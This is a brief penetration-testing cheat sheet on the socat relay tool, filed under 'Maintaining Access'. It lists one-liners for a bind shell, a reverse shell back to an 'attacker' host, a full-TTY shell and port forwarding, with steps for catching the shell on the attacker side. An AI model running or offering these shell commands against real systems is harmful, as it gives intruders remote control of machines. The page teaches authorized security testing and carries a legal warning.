Socat
Multipurpose relay for bidirectional data transfer

Maintaining Access
Description
Socat is a command-line utility that establishes two bidirectional byte streams and transfers data between them. More powerful than netcat.

Installation / Check
Check if installed:

which socat
Install command:

sudo apt install socat
Basic Syntax
socat [options] <address1> <address2>
Common Commands
Command	What it does	When to use	Risk
socat TCP-L:4444,fork EXEC:/bin/bash

Bind shell	Create listening shell	
socat TCP:attacker:4444 EXEC:/bin/bash

Reverse shell	Connect back	
socat TCP-L:4444,fork TCP:target:22

Port forward	Redirect traffic	
socat - OPENSSL:target:443

SSL connection	Encrypted connection	
socat TCP-L:4444,reuseaddr,fork EXEC:"bash -li",pty,stderr,setsid,sigint,sane

Interactive shell	Full TTY shell	
Step-by-Step Guide
1
Start listener on attacker
2
Execute socat on target
3
Receive shell connection
4
Use for encrypted transfers
5
Forward ports as needed
Understanding the Output
Bidirectional data stream between two endpoints.

Important Warnings
•
More powerful than netcat
•
Can bypass firewalls
•
Use only with authorization
⚠️ Use Kali Linux tools only on systems you own or have written permission to test. Unauthorized hacking is illegal and can result in criminal charges.
